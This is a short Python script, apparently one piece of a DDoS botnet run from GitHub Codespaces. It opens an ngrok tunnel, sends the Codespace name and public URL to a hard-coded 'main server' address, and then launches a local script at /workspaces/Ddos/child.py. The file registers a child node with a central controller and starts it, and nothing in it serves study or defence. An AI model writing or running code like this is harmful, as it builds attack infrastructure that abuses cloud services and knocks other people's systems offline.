from pyngrok import ngrok
import os 
import logging
import requests
import subprocess

def getcodespace():
    # Get the name of the Codespace from the environment variable
    codespace_name = os.getenv("CODESPACE_NAME")
    if codespace_name:
        print(f"Codespace Name: {codespace_name}")
        return codespace_name
    else:
        print("This is not running inside a Codespace.")
        return "Unknown Server"  # In case it's not running inside a Codespace

# Function to send the public URL to the main server
def sendurl(public_url):
    server_name = getcodespace()  # Get the Codespace name
    payload = {
        'server': server_name,
        'url': public_url
    }
    
    main_server_url = "http://34.0.0.0:6000/senturl"
    
    try:
        # Use json=payload to send the data as JSON
        response = requests.post(main_server_url, json=payload)
        if response.status_code == 200:
            logging.info("Child Server URL sent to main server successfully.")
            subprocess.run(["python3", "/workspaces/Ddos/child.py"])
        else:
            logging.error(f"Failed to send URL: {response.status_code}")
    except Exception as e:
        logging.error(f"Error sending acknowledgment: {str(e)}")

if __name__ == '__main__':
    # Establish an ngrok tunnel and get the public URL
    public_url = ngrok.connect(5000).public_url
    
    print(f" * ngrok tunnel '{public_url}' -> 'http://127.0.0.1:5000'")
    
    # Send the public URL to the main server
    sendurl(public_url)
